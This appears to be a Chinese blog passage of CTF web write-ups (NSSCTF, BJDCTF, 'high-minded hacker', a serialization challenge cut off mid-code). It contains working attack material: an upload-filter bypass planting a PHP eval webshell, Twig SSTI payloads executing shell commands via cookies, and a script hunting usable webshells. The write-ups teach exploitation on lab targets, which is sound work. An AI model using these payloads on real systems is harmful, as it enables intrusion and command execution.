<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get:</span><br><span class="line">    /fl4g.php?num=<span class="number">1e10</span>&amp;md5=<span class="number">0e215962017</span>&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line">    我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;flag&#123;e264c621-<span class="number">9227</span>-<span class="number">4010</span>-<span class="number">9e26</span>-b9c175413fd9&#125;</span><br></pre></td></tr></table></figure>

<h1 id="NSSCTF二周年-php签到"><a href="#NSSCTF二周年-php签到" class="headerlink" title="NSSCTF二周年 php签到"></a>NSSCTF二周年 php签到</h1><h2 id="原始信息-10"><a href="#原始信息-10" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&quot;ph&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Please re-upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="解题-10"><a href="#解题-10" class="headerlink" title="解题"></a>解题</h2><p>先进行源码分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 限制型数组</span></span><br><span class="line">    <span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&quot;ph&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line">    <span class="comment">// 返回文件路径的扩展名部分，返回的是末尾后缀</span></span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="comment">// 限制型查询</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="comment">// 查看每个限制字符串在后缀中第一次出现的位置，不区分大小写</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// 获取文件名，并且进行url解码</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="comment">// 读取临时文件的内容</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="comment">// 调用waf函数进行文件名检索</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="comment">// 检索无误后写入文件</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Please re-upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里重要的绕过点是waf函数，既要让waf检测不出来，又要在上传文件的时候把一句话木马上传上去，怎么写文件名才是正确的呢？</p>
<p>首先你得幽一个表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 文件上传的地址别写错了 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://node6.anna.nssctf.cn:28501/index.php&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传文件&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>传完截去数据包如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node6.anna.nssctf.cn:<span class="number">28501</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">52.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">52.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1:8034/a.php</span></span><br><span class="line"><span class="comment">DNT: 1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------20381159922317</span></span><br><span class="line"><span class="comment">Content-Length: 232</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-----------------------------20381159922317</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;bb.php%2F.&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?=eval($_POST[1])?&gt;</span></span><br><span class="line"><span class="comment">-----------------------------20381159922317--</span></span><br></pre></td></tr></table></figure>

<p>这里因为文件名有一次URL解码，属于是必须自己加一层URL编码的形式。<br>上传完成后，在网页读取Linux命令行执行的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">URL: view-source:http:<span class="comment">//node6.anna.nssctf.cn:28501/bb.php</span></span><br><span class="line">POST:<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;env&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line">    GIF89a</span><br><span class="line">    PHP_EXTRA_CONFIGURE_ARGS=--with-apxs2 --disable-cgi</span><br><span class="line">    APACHE_CONFDIR=/etc/apache2</span><br><span class="line">    HOSTNAME=<span class="number">3059</span>dfa8bcbd4a7f</span><br><span class="line">    PHP_INI_DIR=/usr/local/etc/php</span><br><span class="line">    SHLVL=<span class="number">0</span></span><br><span class="line">    PHP_EXTRA_BUILD_DEPS=apache2-dev</span><br><span class="line">    PHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie</span><br><span class="line">    APACHE_RUN_DIR=/<span class="keyword">var</span>/run/apache2</span><br><span class="line">    PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2</span><br><span class="line">    PHP_MD5=</span><br><span class="line">    PHP_VERSION=<span class="number">7.3</span>.<span class="number">4</span></span><br><span class="line">    APACHE_PID_FILE=/<span class="keyword">var</span>/run/apache2/apache2.pid</span><br><span class="line">    GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D</span><br><span class="line">    PHP_ASC_URL=https:<span class="comment">//www.php.net/get/php-7.3.4.tar.xz.asc/from/this/mirror</span></span><br><span class="line">    PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2</span><br><span class="line">    PHP_URL=https:<span class="comment">//www.php.net/get/php-7.3.4.tar.xz/from/this/mirror</span></span><br><span class="line">    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">    APACHE_LOCK_DIR=/<span class="keyword">var</span>/lock/apache2</span><br><span class="line">    LANG=C</span><br><span class="line">    APACHE_RUN_GROUP=www-data</span><br><span class="line">    APACHE_RUN_USER=www-data</span><br><span class="line">    APACHE_LOG_DIR=/<span class="keyword">var</span>/log/apache2</span><br><span class="line">    PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c</span><br><span class="line">    PWD=/<span class="keyword">var</span>/www/html</span><br><span class="line">    PHP_SHA256=<span class="number">6</span>fe79fa1f8655f98ef6708cde8751299796d6c1e225081011f4104625b923b83</span><br><span class="line">    APACHE_ENVVARS=/etc/apache2/envvars</span><br><span class="line">    FLAG=NSSCTF&#123;b5b8c95a-<span class="number">7479</span>-<span class="number">4739</span>-<span class="number">8</span>eb0-c0eec41f512a&#125;</span><br></pre></td></tr></table></figure>

<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>除去找文件得到flag，还要查变量得到flag</p>
<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><h2 id="原始信息-11"><a href="#原始信息-11" class="headerlink" title="原始信息"></a>原始信息</h2><p>这次，不扫站都能看到几个重要的页面：index.php和flag.php<br>这次的源码信息主要以下面为主</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 随便输入个ID时，它会从cookie传参，并且在前端页面当中显示出来</span></span><br><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">53</span>b14b76-<span class="number">5393</span>-<span class="number">4090</span>-b860-<span class="number">534</span>bf580c07c.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">52.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">52.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Referer: http://53b14b76-5393-4090-b860-534bf580c07c.node4.buuoj.cn:81/flag.php</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=ed3f7f488bdf5e9bf98017f1eeb70b9c; user=kiti</span></span><br><span class="line"><span class="comment">DNT: 1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br></pre></td></tr></table></figure>

<p>cookie后面的 <strong>user=kiti</strong> 正是我们前面所输入的用户ID。<br>回显到前端页面是：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello kiti<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="解题-11"><a href="#解题-11" class="headerlink" title="解题"></a>解题</h2><p>解题的关键点在于Cooke的那个user传参上。遇到这种情况，先试试有没有模板漏洞。</p>
<p>模板漏洞测试有如下流程：</p>
<p>这个模板，可以适用于Python模板漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="number">7</span>*<span class="number">7</span>&#125;  |==&gt;a&#123;*comment*&#125;b=|=&gt;Smarty</span><br><span class="line">        |                 |=&gt;$&#123;<span class="string">&quot;z&quot;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&quot;ab&quot;</span>)&#125;=|=&gt;Mako</span><br><span class="line">        |                                      |=&gt;Unknown</span><br><span class="line">        |                        |=&gt;Jinja2</span><br><span class="line">        |==&gt;&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;=|=&gt;&#123;&#123;<span class="number">7</span>*<span class="string">&#x27;7&#x27;</span>&#125;&#125;=|=&gt;Twig</span><br><span class="line">                    |            |=&gt;Unknown</span><br><span class="line">                    |=&gt;Not vulnerable</span><br></pre></td></tr></table></figure>

<p>实验了下，符合Twig模板，网上找找相关的漏洞，这里是<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10056#toc-12">参考文章</a><br>从文章中找到此利用，尝试下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 调用ls进行目录查询</span></span><br><span class="line"><span class="comment">//因为回显的点只显示一个结果，遇到空格等就自动分割了，这里用head进行挨个手工查询</span></span><br><span class="line">Cookie: </span><br><span class="line">    user=&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;ls |head -n 1&quot;</span>)&#125;&#125;;PHPSESSID=ed3f7f488bdf5e9bf98017f1eeb70b9c;</span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line">    &lt;h2&gt;Hello bootstrap&lt;/h2&gt;</span><br><span class="line"><span class="comment"># 找到flag文件</span></span><br><span class="line"><span class="comment">// 这里有个坑，根目录下能查到Flag（大写的），无法回显出任何信息</span></span><br><span class="line">Cookie: </span><br><span class="line">    user=&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;ls /|head -n 4&quot;</span>)&#125;&#125;;PHPSESSID=ed3f7f488bdf5e9bf98017f1eeb70b9c;</span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line">    &lt;h2&gt;Hello flag&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件中的flag</span></span><br><span class="line">Cookie: </span><br><span class="line">    user=&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;cat /flag|head -n 1&quot;</span>)&#125;&#125;;PHPSESSID=ed3f7f488bdf5e9bf98017f1eeb70b9c;</span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line">    &lt;h2&gt;Hello flag&#123;<span class="number">8</span>a1f6045-cc94-<span class="number">436</span>a-<span class="number">8874</span>-<span class="number">382</span>d1e25eae8&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure>

<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><h2 id="原始信息-12"><a href="#原始信息-12" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">首先，题目提示了下某个压缩包</span><br><span class="line">其次，某个压缩包打开后充满了一句话木马</span><br><span class="line">最后，我们需要从三千多个文件当中找出可以用的一句话木马来使用。</span><br></pre></td></tr></table></figure>

<h2 id="解题-12"><a href="#解题-12" class="headerlink" title="解题"></a>解题</h2><p>这里就套下别人的脚本了。点我前往<a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/115256974">博客资源</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.<span class="title function_ invoke__">asctime</span>( time.<span class="title function_ invoke__">localtime</span>(time.<span class="title function_ invoke__">time</span>()) ))   <span class="comment">#只是一个简单的时间函数，看起来更漂亮罢了</span></span><br><span class="line">s1=threading.<span class="title function_ invoke__">Semaphore</span>(<span class="number">100</span>)                               <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = r<span class="string">&quot;D:/phpstudy_pro/WWW/test1/&quot;</span></span><br><span class="line">os.<span class="title function_ invoke__">chdir</span>(filePath)                                     <span class="comment">#改变当前的路径，这个还是不太懂</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>                       <span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.<span class="title function_ invoke__">listdir</span>(filePath)                                            <span class="comment">#得到该目录下所有文件的名称</span></span><br><span class="line">session = requests.<span class="title function_ invoke__">Session</span>()                                        <span class="comment">#得到session()为之后的实现代码回显得取创造条件</span></span><br><span class="line">session.keep_alive = False                                <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line">def <span class="title function_ invoke__">get_content</span>(file):</span><br><span class="line">    s1.<span class="title function_ invoke__">acquire</span>()                                                       <span class="comment">#好像与锁什么的相关，但是还是不太懂，多线程开启</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.<span class="title function_ invoke__">asctime</span>( time.<span class="title function_ invoke__">localtime</span>(time.<span class="title function_ invoke__">time</span>()) ))  <span class="comment">#更好看，同时可以对比不加线程和加线程的时间对比</span></span><br><span class="line">    with <span class="title function_ invoke__">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:                   <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="keyword">list</span>(re.<span class="title function_ invoke__">findall</span>(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.<span class="title function_ invoke__">read</span>()))</span><br><span class="line">            posts = <span class="keyword">list</span>(re.<span class="title function_ invoke__">findall</span>(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.<span class="title function_ invoke__">read</span>()))</span><br><span class="line">    data = &#123;&#125;                                         <span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;                                           <span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m in gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n in posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/test1/&#x27;</span>+file</span><br><span class="line">    req = session.<span class="title function_ invoke__">post</span>(url, data=data, params=params)        <span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.<span class="title function_ invoke__">close</span>()                                     <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:                            <span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a in gets:</span><br><span class="line">            req = session.<span class="title function_ invoke__">get</span>(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.<span class="title function_ invoke__">close</span>()                                     <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b in posts:</span><br><span class="line">                req = session.<span class="title function_ invoke__">post</span>(url, data=&#123;<span class="attr">b</span>:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.<span class="title function_ invoke__">close</span>()                                     <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                                      <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.<span class="title function_ invoke__">asctime</span>(time.<span class="title function_ invoke__">localtime</span>(time.<span class="title function_ invoke__">time</span>())))</span><br><span class="line">    s1.<span class="title function_ invoke__">release</span>()                <span class="comment">#对应于之前的多线程打开</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i in files:                                              <span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.<span class="title function_ invoke__">Thread</span>(target=get_content, args=(i,))</span><br><span class="line">   t.<span class="title function_ invoke__">start</span>()</span><br></pre></td></tr></table></figure>

<p>有一点要注意的是：线程数过多可能会超时。</p>
<h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><h2 id="原始信息-13"><a href="#原始信息-13" class="headerlink" title="原始信息"></a>原始信息</h2><p>题意就是容易的序列化php。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span 